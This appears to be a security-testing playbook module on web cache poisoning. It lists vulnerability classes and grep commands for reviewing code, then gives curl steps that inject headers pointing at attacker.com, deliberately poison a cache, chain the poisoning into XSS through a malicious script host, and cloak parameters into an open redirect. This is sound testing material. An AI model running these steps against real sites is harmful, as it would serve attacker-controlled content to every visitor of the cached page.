# VULN MODULE — Web Cache Poisoning
# Asset: webapp
# Report ID prefix: WEB-WCP

## THREAT MODEL

Web caches (CDN, reverse proxy, application cache) store responses keyed on
a subset of request components (usually URL + Host). Unkeyed inputs — headers
or parameters the cache ignores but the server processes — can be used to
inject malicious content into cached responses served to all users.

## VULNERABILITY CLASSES

1. Header-based Cache Poisoning → XSS       CWE-444  — High/Critical
2. Parameter Cloaking                        CWE-444  — Medium/High
3. Cache Key Normalization Abuse             CWE-444  — Medium
4. Fat GET (body in GET request)             CWE-444  — Medium
5. HTTP Response Splitting → Cache Poison    CWE-113  — High
6. Unkeyed Port / Protocol                  CWE-444  — Medium

## WHITEBOX STATIC ANALYSIS

```bash
# Framework cache configuration
grep -rn "cache_control\|Cache-Control\|Vary:\|X-Cache\|surrogate-key" \
  --include="*.conf" --include="*.yaml" --include="*.yml" --include="*.json"

# Varnish / Nginx cache config
grep -rn "proxy_cache\|fastcgi_cache\|proxy_ignore_headers\|proxy_cache_key" \
  --include="*.conf"

# Cloudflare / CDN config files
find . -name "*.toml" -o -name "_headers" -o -name "vercel.json" | \
  xargs grep -l "cache\|Cache" 2>/dev/null

# Application-level headers reflected without sanitization
grep -rn "X-Forwarded-Host\|X-Original-URL\|X-Rewrite-URL\|X-Forwarded-Scheme" \
  --include="*.php" --include="*.py" --include="*.js" --include="*.java"
# If these headers are reflected in responses AND the response is cached → poisoning
```

## BLACKBOX TESTING

### Step 1 — Identify cache behavior
```bash
# Send two identical requests — check for X-Cache / Age / CF-Cache-Status
curl -s -I https://target.com/ | grep -i "x-cache\|age\|cf-cache\|x-varnish"
curl -s -I https://target.com/ | grep -i "x-cache\|age\|cf-cache\|x-varnish"
# Second request should show HIT if caching is active
```

### Step 2 — Find unkeyed headers
```bash
# Use Param Miner (Burp extension) or manual header injection
# Test these headers — if reflected in response without being in cache key:

HEADERS=(
  "X-Forwarded-Host: attacker.com"
  "X-Forwarded-Scheme: nothttps"
  "X-Forwarded-For: 127.0.0.1"
  "X-Host: attacker.com"
  "X-Forwarded-Server: attacker.com"
  "X-HTTP-Method-Override: POST"
  "X-Original-URL: /admin"
  "True-Client-IP: 127.0.0.1"
)

for header in "${HEADERS[@]}"; do
  echo "Testing: $header"
  curl -s -H "$header" "https://target.com/" | grep -i "attacker.com\|127.0.0.1" && echo "REFLECTED!"
done
```

### Step 3 — Cache poisoning PoC
```bash
# If X-Forwarded-Host is reflected in script src / meta refresh:
# 1. Send the poisoning request (do NOT use cache buster — you WANT it cached)
curl -s -H "X-Forwarded-Host: attacker.com" "https://target.com/" > /tmp/response.html
cat /tmp/response.html | grep "attacker.com"

# 2. Verify the poisoned response is now served to clean requests
curl -s "https://target.com/" | grep "attacker.com"
# If seen → cache is poisoned

# Full XSS via poisoned script src:
# If: <script src="//REFLECTED_HOST/app.js"> appears in response
# Then: point X-Forwarded-Host to attacker.com hosting malicious app.js
# Impact: XSS on all users receiving the cached response
```

### Step 4 — Parameter cloaking
```bash
# Some caches strip certain parameters before caching
# Test: does ?utm_source= get stripped from cache key?
curl -s "https://target.com/page?utm_source=x&next=//attacker.com" | grep "attacker"
# If reflected but stripped from cache key → cache-poisoned open redirect for all users
```

## TOOLS

```bash
# Web Cache Vulnerability Scanner
pip install wcvs
wcvs -u https://target.com/

# Param Miner (Burp Suite extension)
# BApp Store → Param Miner → right-click request → Guess headers
```
